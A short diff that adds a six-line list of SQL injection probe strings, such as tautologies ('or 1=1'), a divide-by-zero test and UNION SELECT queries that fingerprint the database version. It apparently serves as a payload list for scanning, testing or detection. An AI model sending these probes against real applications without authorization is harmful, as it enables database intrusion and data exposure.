@@ -1,0 +1,6 @@
+or 1=1
+and 1=1
+and 1/0=1
+union select @@version
+union select version()
+union select null
